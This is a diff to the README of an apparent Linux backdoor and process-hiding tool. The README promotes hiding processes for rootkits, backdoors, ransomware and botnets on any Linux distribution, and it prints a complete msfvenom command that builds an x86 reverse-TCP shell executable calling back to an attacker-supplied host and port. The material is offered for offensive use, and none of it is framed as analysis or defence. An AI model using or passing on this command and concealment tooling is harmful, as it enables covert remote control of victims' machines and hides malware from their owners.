@@ -17,7 +17,7 @@ when backdoor already setup it will be ***hidden*** your spesisifc process,***un
 
 #### READ THIS
 
-- right now i just tested backdoor with msfvenom command using reverse_shell [ **its work** ] 
+- right now i just tested backdoor with msfvenom command using reverse_shell and my manual backdoor for linux [ **its work** ] 
 - **msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR**
 - for hidden process you can use for **rootkits,backdoor,ransom and botnet** { sh,python,perl,exe and binary }.
 - Victim  target all linux distribution include ( **base32** and **base64** in their system ) 
